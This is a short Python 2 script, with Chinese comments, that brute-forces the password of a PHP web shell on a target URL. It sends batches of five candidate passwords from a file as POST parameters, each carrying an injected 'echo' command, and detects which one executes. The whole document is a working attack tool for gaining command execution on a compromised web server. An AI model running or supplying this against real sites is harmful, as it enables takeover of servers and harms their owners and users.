#!/usr/bin/python
#-*- coding:utf-8 -*-
import requests

def req(url,s,ss,sss,ssss,sssss):
    global html
    data = {s:'echo xc666%s;'%s,
            ss:'echo xc666%s;'%ss,
            sss:'echo xc666%s;'%sss,
            ssss:'echo xc666%s;'%ssss,
            sssss:'echo xc666%s;'%sssss,}
    req = requests.post(url,data=data)
    html = req.content
    print req.url,s,ss,sss,ssss,sssss

shell = []
def shelllist():
    f = open('shell.txt','r')
    for x in f.readlines(): #去除换行等字符
        x = x.strip()
        shell.append(x)
    print u"\nshell密码个数为：",len(shell)

def main():
    shelllist()
    url = raw_input('\nshell url:')
    if 'http' not in url:
        url = 'http://'+url
    for i in range(0,len(shell),5): #分割列表
        b=shell[i:i+5]
        req(url,b[0],b[1],b[2],b[3],b[4])
        if "xc666%s"%b[0] in html:
            print "\n[+]Find password",b[0]
            break
        elif "xc666%s"%b[1] in html:
            print "\n[+]Find password", b[1]
            break
        elif "xc666%s"%b[2] in html:
            print "\n[+]Find password",b[2]
            break
        elif "xc666%s"%b[3] in html:
            print "\n[+]Find password", b[3]
            break
        elif "xc666%s"%b[4] in html:
            print "\n[+]Find password", b[4]
            break
if __name__ == '__main__':
    main()